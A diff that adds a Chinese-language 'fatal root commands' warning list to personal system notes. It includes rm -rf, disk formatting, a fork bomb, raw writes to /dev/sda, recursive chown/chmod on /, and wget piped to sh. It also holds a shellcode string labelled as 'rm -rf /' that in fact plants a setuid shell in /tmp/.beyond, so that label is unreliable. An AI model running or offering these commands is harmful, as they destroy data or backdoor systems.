@@ -60,6 +60,36 @@
 	# qq	
 		# chatting records
 			C:\Users\Administrator\Documents\Tencent Files\qq_number\Msg2.0.db
+# attack 
+	# 致命的根权限命令
+		# 1. rm -f      # 将删除目录下的所有文件
+		# 2. 这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
+			char esp[] __attribute__ ((section(".text"))) /* e.s.p
+			release */
+			= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+			"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+			"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+			"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+			"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+			"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+			"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+			"cp -p /bin/sh /tmp/.beyond; chmod 4755
+			/tmp/.beyond;";
+		# 3. mkfs.ext3 dev/sda   # 这将对硬盘进行重新格式化
+		# 4. :(){ :|:& };:       # 著名的 fork 炸弹，此命令将告诉你的
+								 # 系统执行海量的进程，直到你的系统僵死。
+		# 5.  any_command > /dev/sda  # 使用该命令,原始数据将被写到块设备,
+									  # 其结果是造成数据丢失
+		# 6. wget http://some_untrsted_source -0- | sh #  不要从不信任的地方下载
+													  # 东西,这可能会获取恶意代码.
+		# 7. mv /home/yourhomedirectory/* /dev/null  # 将移动主目录到一个不存在的地方
+		# 8. cat /dev/null > /dev/sda
+
+		# 9. chown -R someone /
+
+		# 10 chmod 7777 -R /   
+
+		# cp xxx.txt /dev/sda5       # 如果没挂载则D盘的分区会没了
 			
 # port 
 	number	protocol   description
